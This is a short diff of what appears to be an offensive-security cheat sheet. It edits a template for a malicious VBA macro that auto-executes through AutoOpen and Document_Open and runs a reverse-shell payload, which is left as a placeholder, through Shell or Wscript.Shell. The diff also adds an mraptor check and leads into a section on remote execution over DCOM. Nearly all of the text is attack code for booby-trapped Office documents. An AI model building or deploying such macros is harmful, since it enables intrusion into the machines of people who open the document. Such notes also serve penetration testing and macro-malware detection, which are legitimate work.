@@ -250,13 +250,13 @@ for i in range(0, len(str), n):
 print "Str = Str + " + '"' + str[i:i+n] + '"'
 
 # create VBA macro -> insert into Excel file
-Sub AutoOpen()      # auto-exec macro when new doc is opened
+Sub AutoOpen()
     exploit
 End Sub
-Sub Document_Open() # auto-exec macro when doc is re-opened
+Sub Document_Open()
     exploit
 End Sub
-Sub exploit()       # reverse shell payload
+Sub exploit()
         Dim str As String
         {insert_payload_here}
         # OPTION 1
@@ -264,6 +264,9 @@ Sub exploit()       # reverse shell payload
         # OPTION 2
         # CreateObject("Wscript.Shell").Run str
 End Sub
+
+# check if document contains valid exploit macro
+$ mraptor [exploit.doc]
 ```
 
 DCOM - Copy file to remote and execute
